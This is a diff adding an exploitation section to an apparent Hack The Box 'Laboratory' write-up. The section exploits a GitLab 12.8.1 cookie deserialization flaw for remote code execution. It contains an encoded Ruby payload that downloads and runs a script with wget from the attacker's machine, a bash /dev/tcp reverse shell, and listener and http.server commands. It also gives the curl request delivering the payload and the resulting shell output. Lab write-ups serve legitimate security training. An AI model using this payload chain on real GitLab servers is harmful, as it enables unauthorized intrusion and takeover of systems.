@@ -254,6 +254,33 @@ Now for create exploit RCE we need to up docker with gitlab version 12.8.1 in an
 And we got a payload:
 ```AhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec```
 
+Now we create reverse shell *pasha.sh*
+```
+bash -i >& /dev/tcp/10.10.14.162/1234 0>&1
+```
+
+After start `python3 -m http.server 8888`
+And use `nc -nlvp 1234`
+
+We need install extensions *Cookie-Editor* in Mozilla fire fox. And login with "Remeber me".
+We wiil send a cookie payload to *remeber_user_token*
+![](img src="https://i.ibb.co/KbJdbkx/2021-01-18-225644.png)
+
+Starting payload...
+```
+┌──(root💀kali)-[/home/kali/HTB/Labartory]
+└─# curl -k 'https://git.laboratory.htb/' -b "remember_user_token=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAY4jY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTYyOjg4ODgvcGFzaGEuc2ggJiYgY2htb2QgK3ggcGFzaGEuc2ggJiYgL2Jpbi9iYXNoIHBhc2hhLnNoYCApLnRvX3MpOyBfZXJib3V0BjoGRUY6DkBlbmNvZGluZ0l1Og1FbmNvZGluZwpVVEYtOAY7CkY6E0Bmcm96ZW5fc3RyaW5nMDoOQGZpbGVuYW1lMDoMQGxpbmVub2kAOgxAbWV0aG9kOgtyZXN1bHQ6CUB2YXJJIgxAcmVzdWx0BjsKVDoQQGRlcHJlY2F0b3JJdTofQWN0aXZlU3VwcG9ydDo6RGVwcmVjYXRpb24ABjsKVA==--5baee5481c899005c1ea5783cf6bbb6c9f644fec"
+```
+And we get a shell of system user **git**
+```
+┌──(root💀kali)-[/home/kali/HTB/Labartory]
+└─# nc -nlvp 1234                                                                                                                                                      1 ⨯
+listening on [any] 1234 ...
+connect to [10.10.14.162] from (UNKNOWN) [10.10.10.216] 46810
+bash: cannot set terminal process group (403): Inappropriate ioctl for device
+bash: no job control in this shell
+git@git:~/gitlab-rails/working$ 
+```
 # Privilege Escalation
 
 # Result and Resources
